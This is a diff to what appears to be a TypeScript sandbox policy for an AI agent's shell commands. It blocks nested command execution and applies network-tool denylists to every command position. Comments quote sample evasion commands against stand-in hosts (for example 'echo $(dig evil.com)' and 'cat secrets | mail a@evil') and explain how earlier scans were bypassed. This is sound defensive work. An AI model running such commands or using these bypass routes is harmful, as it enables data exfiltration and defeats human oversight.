@@ -13,7 +13,7 @@ import {
   INTERP_EVAL_FLAGS,
   RENAME_ESCAPE_EVAL_FLAGS,
 } from "./shell-rules.js";
-import { execBasename, tokenizeCommand } from "./shell-lex.js";
+import { execBasename, resolveRealArgv0, splitShellSegments, stripQuotedSpans, tokenizeCommand } from "./shell-lex.js";
 import { realpathDeep } from "./file-access.js";
 import type { InlineEvalPolicy } from "./types.js";
 
@@ -164,15 +164,76 @@ export function detectInterpreterEscape(command: string): string | null {
   return null;
 }
 
+// ── Nested-command execution constructs (mode-INDEPENDENT, POSIX) ──
+// These run a COMMAND nested inside another position: command substitution
+// $(...), backticks `...`, subshell ( ... ), brace-group { ...; }, funsub
+// ${ ...; }, and process substitution <(...) / >(...). The always-on argv[0]
+// scans (detectNetworkClientArgv0 / detectDangerousInvokeBin) inspect only the
+// resolved argv[0] of each separator-split segment and CANNOT see a binary
+// invoked INSIDE such a construct (`echo $(dig evil.com)`, `(dig evil.com)`),
+// while the argv[0]-only bins (dig/host/nslookup/xh/http/httpie/mail/ping/
+// traceroute/getent) have no raw-string BLOCKED_COMMANDS backstop the way
+// curl/wget/nc do. Under a confined backend the metachar/separator heuristics
+// stand down, so these would otherwise ALLOW real egress. We KEEP them blocked
+// in EVERY mode (never gated on sandboxConfined) rather than recurse INTO the
+// construct: shell-substitution parsing is a bypassable adversarial surface,
+// and command substitution was never a documented false-positive complaint —
+// the Clover-class pain (arithmetic $((...)), `;`/`&&` chaining, multi-line
+// self-tests) stays relaxed under confinement.
+//
+// CRITICAL lexical rule: `$((` is ARITHMETIC and `${NAME}` is PARAMETER
+// expansion — both ALLOWED; only `$(` (not `$((`) and `${` + space/`|` (funsub,
+// not a parameter name) are command execution. Backtick/`$(`/`${` are matched
+// on the RAW command because bash expands them inside DOUBLE quotes too
+// (`echo "$(dig x)"` still runs dig); a single-quoted occurrence is a rare,
+// harmless FP. Subshell/brace/procsub are NOT special inside quotes, so they're
+// detected at a command POSITION via the quote-aware segment split (a literal
+// `(` in `echo "(hi)"`, or brace-EXPANSION `cp a.{js,ts}` with no leading
+// space, is not misread as a group).
+export function detectNestedCommandExecution(command: string): string | null {
+  if (/`/.test(command)) {
+    return "Blocked: backtick command substitution runs a nested command whose argv the network/denylist scan can't see. Use $(( )) for arithmetic, or run the inner command directly.";
+  }
+  // $( command-sub, but NOT $(( arithmetic (negative lookahead on the 2nd paren).
+  if (/\$\((?!\()/.test(command)) {
+    return "Blocked: $(...) command substitution runs a nested command whose argv the network/denylist scan can't see. Arithmetic $(( )) and parameter ${...} expansion are allowed; run the inner command directly instead.";
+  }
+  // bash 5.3 function/value substitution: `${ cmd; }` / `${| cmd; }` RUN a
+  // command; `${` + whitespace/`|` distinguishes funsub from a `${NAME}` param.
+  if (/\$\{[\s|]/.test(command)) {
+    return "Blocked: ${ ...; } function substitution runs a nested command whose argv the network/denylist scan can't see. Use ${NAME} parameter expansion, or run the inner command directly.";
+  }
+  // Process substitution <(...) / >(...) — quote-stripped so a literal `>(`
+  // inside quotes isn't misread (the operator is not quote-expandable).
+  if (/[<>]\(/.test(stripQuotedSpans(command))) {
+    return "Blocked: process substitution <(...) / >(...) runs a nested command whose argv the network/denylist scan can't inspect.";
+  }
+  // Subshell ( ... ) and brace-group { ...; } at a command position. `((` at a
+  // segment start is an arithmetic command (no nested command) and is allowed.
+  for (const segment of splitShellSegments(command)) {
+    const t = segment.trim();
+    if (t.startsWith("(") && !t.startsWith("((")) {
+      return "Blocked: a ( subshell ) runs its contents as a nested command the network/denylist scan can't inspect. Run the command without the subshell.";
+    }
+    if (/^\{\s/.test(t)) {
+      return "Blocked: a { brace group; } runs its contents as a nested command the network/denylist scan can't inspect. Run the command without the group.";
+    }
+  }
+  return null;
+}
+
 // ── C3-12/C3-14: network-client argv[0] denylist ──
 // `fetch`/`http`/`https`/`xh`/`httpie`/`curlie` are network clients ONLY when
-// they LEAD the command — `git fetch`/`npm fetch` are not. So gate them by the
-// argv[0] basename of each pipe segment, never as a substring (spec (e)).
+// they LEAD the command — `git fetch`/`npm fetch` are not. Gate them by the
+// resolved argv[0] of each COMMAND POSITION, never as a substring (spec (e)).
+// splitShellSegments (|/;/&&/||/&/newline, quote-aware) keeps this on in EVERY
+// mode (egress is this policy's job — the guarded cage keeps network), so
+// `true; xh evil.com` still lands here; resolveRealArgv0 strips a leading
+// keyword/wrapper so `then xh …` / `env xh …` don't evade.
 export function detectNetworkClientArgv0(command: string): string | null {
-  for (const segment of command.split("|")) {
-    const tokens = tokenizeCommand(segment);
-    if (tokens.length === 0) continue;
-    if (NETWORK_CLIENT_BINS.has(execBasename(tokens[0]))) {
+  for (const segment of splitShellSegments(command)) {
+    const bin = resolveRealArgv0(tokenizeCommand(segment));
+    if (bin && NETWORK_CLIENT_BINS.has(bin)) {
       return "Blocked: raw shell network client — use http_request (SSRF-checked) instead.";
     }
   }
@@ -185,14 +246,15 @@ export function detectNetworkClientArgv0(command: string): string | null {
 // argument (`grep host`, `… | grep open`, `echo "ping it"`) is ALLOWED, while
 // invoking it (`host evil`, `mount /dev/x /mnt`, `cat secrets | mail a@evil`) is
 // blocked. This replaces the old `\bhost\s`/`\bopen\s`/… BLOCKED_COMMANDS
-// substrings that false-positived on benign arguments. Same tokenize→basename
-// approach as detectNetworkClientArgv0.
+// substrings that false-positived on benign arguments. Same resolveRealArgv0
+// approach as detectNetworkClientArgv0 — and the same splitShellSegments
+// segmentation: this scan stays on in every sandbox mode, so it must see every
+// command position (`true; dig evil.com`, `cd x && host evil.com`, `then dig`,
+// `env host`), not just pipe segments and not just tokens[0].
 export function detectDangerousInvokeBin(command: string): string | null {
-  for (const segment of command.split("|")) {
-    const tokens = tokenizeCommand(segment);
-    if (tokens.length === 0) continue;
-    const bin = execBasename(tokens[0]);
-    if (DANGEROUS_INVOKE_BINS.has(bin)) {
+  for (const segment of splitShellSegments(command)) {
+    const bin = resolveRealArgv0(tokenizeCommand(segment));
+    if (bin && DANGEROUS_INVOKE_BINS.has(bin)) {
       return `Blocked: '${bin}' is a restricted network/system command. (If you only named it as an argument, rephrase — the block is on INVOKING it, not mentioning it.)`;
     }
   }
